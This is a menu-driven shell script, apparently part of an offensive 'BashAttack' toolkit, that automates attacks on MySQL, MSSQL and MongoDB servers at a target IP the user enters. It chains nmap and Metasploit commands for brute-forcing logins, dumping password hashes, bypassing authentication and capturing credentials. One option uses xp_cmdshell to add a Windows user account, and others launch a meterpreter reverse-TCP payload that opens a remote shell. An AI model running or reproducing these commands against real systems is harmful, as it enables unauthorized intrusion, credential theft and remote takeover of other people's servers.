#!/bin/sh
#Database script
#Code by DroPZsec
#

#COLORED_OUTPUT

blue='\033[94m'
red='\033[91m'
green='\033[92m'
orange='\033[93m'
reset='\e[0m'
magenta='\u001b[35m'
yellow='\u001b[33m'

# MENU CODE

clear
    sleep 1.0
echo $green "Loading Database Menu..." $reset 
    sleep 1.0
clear
    sleep 0.25
echo $orange 
figlet -f small "Database Menu"
echo "" $reset 
echo "" 
echo ""
echo ""
echo "" 
echo $blue"1."$reset $orange")"$reset $green "MySQL Server Version Enumeration" $reset 
    sleep 0.25
echo $blue"2."$reset $orange")"$reset $green "MySQL Database Scanner" $reset 
    sleep 0.25
echo $blue"3."$reset $orange")"$reset $green "MySQL Login Data search" $reset 
    sleep 0.25
echo $blue"4."$reset $orange")"$reset $green "MySQL VULN CVE2012-2122 (Authentication Bypass)" $reset 
    sleep 0.25
echo $blue"5."$reset $orange")"$reset $green "MSSQL Server Version Enumeration" $reset 
    sleep 0.25
echo $blue"6."$reset $orange")"$reset $green "MSSQL Database Scanner" $reset 
    sleep 0.25
echo $blue"7."$reset $orange")"$reset $green "MSSQL Login Data Search" $reset 
    sleep 0.25
echo $blue"8."$reset $orange")"$reset $green "MSSQL XP CMD-Shell (CVE-2000-0402)" $reset 
    sleep 0.25
echo $blue"9."$reset $orange")"$reset $green "MongoDB Full-Scan" $reset 
    sleep 0.25
echo $blue"10."$reset $orange")"$reset $green "EXIT" $reset 
    sleep 0.25
echo $green "Enter your choice:" $reset
    read answer;
if [ $answer = 1 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -Pn -p3306 $ip --script mysql-enum -d
    sudo nmap -Pn -p3306 $ip --script mysql-info -d
    msfconsole -q -x " use auxiliary/scanner/mysql/mysql_version; set rhosts $ip; exploit; exit; "
    msfconsole -q -x " use auxiliary/scanner/mysql/mysql_hashdump; set rhosts $ip; exploit; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter; 
fi 
if [ $answer = 2 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -Pn -sV -p3306 $ip --script mysql-databases -d 
    sudo nmap -Pn -p3306 $ip --script mysql-audit -d
    sudo nmap -Pn -p3306 $ip --script mysql-variables -d 
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 3 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -Pn -p3306 $ip --script mysql-users -d 
    sudo nmap -Pn -p3306 $ip --script mysql-query -d 
    sudo nmap -Pn -p3306 $ip --script mysql-empty-password -d 
    msfconsole -q -x " use auxiliary/scanner/mysql/mysql_login; set rhosts $ip; run; exit; "
    msfconsole -q -x " use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set rhosts $ip; run; exit; "
    msfconsole -q -x " use auxiliary/server/capture/mysql; set srvhost eth0; set rhosts $ip; run; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 4 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -Pn -sV -p3306 $ip --script mysql-vuln-cve2012-2122 -d 
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi
if [ $answer = 5 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -Pn -p445 $ip --script ms-sql-info -d
    sudo nmap -Pn -p1433 $ip --script ms-sql-info --script-args mssql.instance-port=1433 -d 
    sudo nmap -Pn -p1433 $ip --script ms-sql-ntlm-info -d 
    msfconsole -q -x " use auxiliary/admin/mssql/mssql_sql; set rhosts $ip; run; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 6 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -Pn -p1433 --script ms-sql-config $ip --script-args mssql.username=sa,mssql.password=sa -d 
    sudo nmap -sU -p1434 $ip --script ms-sql-dac -d
    sudo nmap -Pn -p445 $ip --script ms-sql-empty-password --script-args mssql.instance-all -d 
    sudo nmap -Pn -p1433 $ip --script ms-sql-empty-password -d
    sudo nmap -Pn -p1433 $ip --script ms-sql-ntlm-info -d
    sudo nmap -Pn -p1433 $ip --script ms-sql-query -d
    sudo nmap -Pn -p1433 $ip --script ms-sql-hasdbaccess --script-args mssql.username=sa,mssql.password=sa -d
    sudo nmap -Pn -p1433 $ip --script ms-sql-tables --script-args mssql.username=sa,mssql.password=sa -d
    sudo nmap -Pn -p1433 $ip --script ms-sql-hasdbaccess --script-args mssql.username=sa,mssql.password=sa -d
    msfconsole -q -x " use auxiliary/admin/mssql/mssql_enum; set rhosts $ip; run; exit; "
    msfconsole -q -x " use auxiliary/scanner/mssql/mssql_ping; set rhosts $ip; run; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 7 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -sU -p1434 $ip --script ms-sql-dac -d
    sudo nmap -Pn -p445 $ip --script ms-sql-empty-password --script-args mssql.instance-all -d 
    sudo nmap -Pn -p1433 $ip --script ms-sql-empty-password -d
    sudo nmap -Pn -p445 $ip --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt -d
    sudo nmap -Pn -p1433 $ip --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt -d
    sudo nmap -Pn -p1433 $ip --script ms-sql-dump-hashes -d
    msfconsole -q -x " use auxiliary/scanner/mssql/mssql_login; set rhosts $ip; run; exit; "
    msfconsole -q -x " use auxiliary/scanner/mssql/mssql_hashdump; set rhosts $ip; run; exit; "
    msfconsole -q -x " use auxiliary/admin/mssql/mssql_enum_sql_logins; set rhosts $ip; run; exit; "
    msfconsole -q -x " use auxiliary/admin/mssql/mssql_enum_domain_accounts; set rhosts $ip; run; exit; "
    msfconsole -q -x " use auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli; set rhosts $ip; run; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 8 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -Pn -p445 $ip --script ms-sql-discover,ms-sql-empty-password,ms-sql-xp-cmdshell -d
    sudo nmap -Pn -p1433 $ip --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user test test /add"  -d 
    msfconsole -q -x " use auxiliary/admin/mssql/mssql_exec; set rhosts $ip; run; exit; "
    msfconsole -q -x " use exploit/windows/mssql/mssql_payload; set payload windows/meterpreter/reverse_tcp; set rhosts $ip; set lhost eth0; run; exit; "
    msfconsole -q -x " use exploit/windows/mssql/mssql_payload_sqli; set payload windows/meterpreter/reverse_tcp; set rhosts $ip; set lhost eth0; run; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 9 ]; then
    echo $green "Enter Target IP:"
        read ip;
    sudo nmap -Pn -p27017 $ip --script mongodb-info -d
    sudo nmap -Pn -p27017 $ip --script mongodb-databases -d
    sudo nmap -Pn -p27017 $ip --script mongodb-brute -d
    msfconsole -q -x " use auxiliary/scanner/mongodb/mongodb_login; set rhosts $ip; run; exit; "
    msfconsole -q -x " use auxiliary/gather/mongodb_js_inject_collection_enum; set rhosts $ip; run; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 10 ]; then 
     echo $green "OK, Youre Choice..."
        sleep 1.0
    clear
    echo $blue
    figlet -f small "Database script"
        sleep 0.5 
    figlet -f small "coded by:"
    echo $reset $orange 
        sleep 1.0 
    figlet -f big "vDroPZz"
        sleep 1.0
    clear 
    echo $reset $blue  
    figlet -f small "Follow me on Github:"
    echo $reset $orange 
        sleep 0.5 
    figlet -f big "DroPZsec"
        sleep 1.5 
    clear 
    echo $reset 
    cd ..
    ./BashAttack.sh  
fi 
./databases.sh 
/bin/sh 